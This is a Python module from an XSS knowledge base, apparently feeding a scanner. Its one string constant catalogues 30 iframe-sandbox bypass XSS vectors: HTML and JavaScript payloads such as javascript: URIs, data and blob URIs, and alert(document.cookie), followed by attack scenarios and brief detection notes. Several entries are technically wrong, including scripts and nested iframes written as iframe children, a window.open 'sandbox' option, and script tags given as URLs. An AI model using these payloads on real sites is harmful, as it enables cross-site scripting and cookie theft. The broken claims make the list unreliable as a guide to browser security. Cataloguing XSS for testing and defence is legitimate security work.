#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

iframe Sandbox XSS Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
IFRAME SANDBOX BYPASS XSS ATTACK VECTORS:

1. INCOMPLETE SANDBOX POLICY:
   iframe without proper sandbox restrictions:
   <iframe src="USER_CONTENT" sandbox="allow-scripts"></iframe>

   Missing restrictions:
   - allow-same-origin (allows origin access)
   - allow-top-navigation (allows top window navigation)
   - allow-forms (allows form submission)
   - allow-popups (allows popup creation)

2. SANDBOX ALLOWLIST BYPASS:
   Overly permissive sandbox:
   <iframe src="USER_CONTENT" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>

   Allows:
   - Script execution
   - Same-origin access
   - Form submission
   - Potential XSS through forms

3. USER-CONTROLLED SANDBOX ATTRIBUTE:
   Dynamic sandbox configuration:
   <iframe src="content.html" sandbox="USER_INPUT"></iframe>

   Attack payload:
   allow-scripts allow-same-origin allow-top-navigation

4. NESTED IFRAME BYPASS:
   Nested iframe structure:
   <iframe src="outer.html">
     <iframe src="USER_CONTENT" sandbox="allow-scripts"></iframe>
   </iframe>

   Outer iframe can manipulate inner sandbox

5. SRC ATTRIBUTE INJECTION:
   iframe src with XSS:
   <iframe src="javascript:USER_INPUT"></iframe>

   Attack payload:
   alert(document.cookie)

ADVANCED IFRAME SANDBOX BYPASS TECHNIQUES:

6. DATA URI BYPASS:
   Data URI in sandboxed iframe:
   <iframe src="data:text/html,<script>alert(1)</script>" sandbox="allow-scripts"></iframe>

   Sandbox doesn't prevent script execution in data URIs

7. BLOB URI BYPASS:
   Blob URI with malicious content:
   const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
   const url = URL.createObjectURL(blob);

   <iframe src="url" sandbox="allow-scripts"></iframe>

8. OBJECT ELEMENT BYPASS:
   Object element with sandbox bypass:
   <object data="USER_CONTENT" type="text/html"></object>

   Object elements have different sandbox behavior

9. EMBED ELEMENT BYPASS:
   Embed element injection:
   <embed src="USER_CONTENT" type="text/html"></embed>

   Embed elements may bypass some iframe restrictions

10. FRAME ELEMENT BYPASS:
    Legacy frame element:
    <frame src="USER_CONTENT"></frame>

    Frame elements have different security model

11. WINDOW.OPEN BYPASS:
    Popup window with bypass:
    window.open(USER_CONTENT, '_blank', 'sandbox');

    Sandbox in popup may be bypassed

12. POSTMESSAGE BYPASS:
    Cross-origin communication:
    iframe.contentWindow.postMessage(USER_INPUT, '*');

    PostMessage can bypass some sandbox restrictions

13. NAVIGATION TIMING BYPASS:
    Navigation timing manipulation:
    <iframe src="timing.html" sandbox="allow-scripts">
      <script>
        // Access timing information
        const timing = performance.getEntriesByType('navigation')[0];
        // Potential information disclosure
      </script>
    </iframe>

14. RESOURCE TIMING BYPASS:
    Resource timing access:
    <iframe src="resources.html" sandbox="allow-scripts">
      <script>
        const resources = performance.getEntriesByType('resource');
        // Access resource information
      </script>
    </iframe>

15. CSP INHERITANCE BYPASS:
    CSP inheritance in sandboxed frames:
    <iframe src="csp.html" sandbox="allow-scripts">
      <!-- May inherit or bypass CSP -->
    </iframe>

IFRAME SANDBOX-SPECIFIC BYPASSES:

16. SANDBOX TOKEN ESCAPE:
    Sandbox token manipulation:
    <iframe sandbox="allow-scripts" src="data:text/html,<script>top.location='javascript:alert(1)'</script>"></iframe>

17. ALLOW-TOP-NAVIGATION BYPASS:
    Top navigation with XSS:
    <iframe src="navigation.html" sandbox="allow-top-navigation">
      <!-- Can navigate top window to XSS -->
    </iframe>

18. ALLOW-FORMS BYPASS:
    Form submission XSS:
    <iframe src="form.html" sandbox="allow-forms">
      <form action="javascript:alert(1)">
        <input type="submit">
      </form>
    </iframe>

19. ALLOW-POPUPS BYPASS:
    Popup creation XSS:
    <iframe src="popup.html" sandbox="allow-popups">
      <script>window.open('javascript:alert(1)')</script>
    </iframe>

20. ALLOW-SAME-ORIGIN BYPASS:
    Same-origin access XSS:
    <iframe src="/same-origin" sandbox="allow-same-origin allow-scripts">
      <script>
        // Can access parent window
        top.document.body.innerHTML = '<script>alert(1)</script>';
      </script>
    </iframe>

REAL-WORLD ATTACK SCENARIOS:

21. EMBEDDED WIDGET ATTACK:
    - Third-party widget platform
    - Widget URL: <script>alert(1)</script>
    - Insufficient sandbox policy
    - Widget compromises host site

22. ADVERTISEMENT SYSTEM:
    - Ad network with embedded ads
    - Ad content: <script>alert(1)</script>
    - Sandbox bypass in ads
    - Ad-based XSS attacks

23. DOCUMENT VIEWER:
    - Online document viewer
    - Document URL: <script>alert(1)</script>
    - Viewer iframe XSS
    - Document-based attacks

24. SOCIAL MEDIA EMBED:
    - Social media post embed
    - Post content: <script>alert(1)</script>
    - Embed XSS
    - Social engineering attacks

25. FILE UPLOAD VIEWER:
    - File upload preview
    - Uploaded file: <script>alert(1)</script>
    - Preview iframe XSS
    - File upload attacks

26. EXTERNAL CONTENT EMBED:
    - External content integration
    - Content URL: <script>alert(1)</script>
    - Integration XSS
    - Third-party compromise

27. LEGACY BROWSER EXPLOIT:
    - Older browser versions
    - Sandbox implementation flaws
    - Legacy bypass techniques
    - Browser-specific attacks

IFRAME SANDBOX BYPASS DETECTION:

28. MANUAL TESTING:
    - Browser DevTools iframe inspection
    - Sandbox attribute verification
    - Content Security Policy checking
    - Cross-origin testing

29. AUTOMATED SCANNING:
    - iframe sandbox analysis
    - Sandbox policy validation
    - Bypass technique testing
    - Content isolation verification

30. PROXY MONITORING:
    - iframe traffic interception
    - Sandbox policy monitoring
    - Content validation
    - Isolation breach detection
"""
